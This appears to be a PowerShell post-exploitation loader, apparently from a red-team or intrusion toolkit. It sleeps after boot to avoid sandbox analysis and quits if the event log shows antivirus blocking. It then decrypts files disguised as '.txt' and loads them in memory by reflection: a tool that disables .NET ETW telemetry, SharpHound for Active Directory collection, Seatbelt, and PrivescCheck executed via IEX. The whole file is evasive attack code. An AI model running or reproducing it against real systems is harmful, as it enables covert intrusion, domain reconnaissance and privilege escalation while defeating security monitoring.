$__cmdletization_objectModelWrapper = (Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime;if ($__cmdletization_objectModelWrapper.TotalMinutes -lt 5) {Start-Sleep -Seconds 300}

Start-Sleep -Seconds 4
$log = Get-WinEvent -filterhashtable @{logname="Microsoft-Windows-PowerShell/Operational";id=4100} -erroraction 'silentlycontinue' | Where {$_.Message -like "*This script contains malicious content and has been blocked by your antivirus software.*"}
if($log)
{ 
    exit; 
}

# ------------
# C#
# ------------

# Disable Microsoft-Windows-DotNETRuntime ETW provider
$application = "$($env:USERPROFILE)\Documents\etw.exe.txt"
$encryptedData = [System.IO.File]::ReadAllBytes($application)
$OutputString = ModelWrapper $arg1 $encryptedData
$command = ""
$app = "Etw.Program"
$method = "Main"
$Assembly = [Reflection.Assembly]::Load($OutputString)
$Assembly.GetType($app).GetMethod($method).Invoke($Null, @(,$command.Split(" ")))

# Run S h a r p h o u n d
$application = "$($env:USERPROFILE)\Documents\sharph.exe.txt"
$encryptedData = [System.IO.File]::ReadAllBytes($application)
$OutputString = ModelWrapper $arg1 $encryptedData
$command = "-d test.domain.ch -c DCOnly"
$app = "Sharphound.Program"
$method = "Main"
$Assembly = [Reflection.Assembly]::Load($OutputString)
$Assembly.GetType($app).GetMethod($method).Invoke($Null, @(,$command.Split(" ")))

# Run S e a t b e l t
$application = "$($env:USERPROFILE)\Documents\seatb.exe.txt"
$encryptedData = [System.IO.File]::ReadAllBytes($application)
$OutputString = ModelWrapper $arg1 $encryptedData
$command = "-group=all -outputfile=$($env:USERPROFILE)\Documents\knowissues.txt"
$app = "Seatbelt.Program"
$method = "Main"
$Assembly = [Reflection.Assembly]::Load($OutputString)
$Assembly.GetType($app).GetMethod($method).Invoke($Null, @(,$command.Split(" ")))

# ------------
# POSH
# ------------

# Run P r i v e s c
$application = "$($env:USERPROFILE)\Documents\PrivCheck.ps1.txt"

$encryptedData = [System.IO.File]::ReadAllBytes($application)
$OutputString = ModelWrapper $arg1 $encryptedData
$OutputString = [System.Text.Encoding]::Default.GetString($OutputString)
$OutputString | IEX
Invoke-PrivescCheck -Extended -Report "readme3_$($env:COMPUTERNAME)" -Format TXT,CSV,HTML
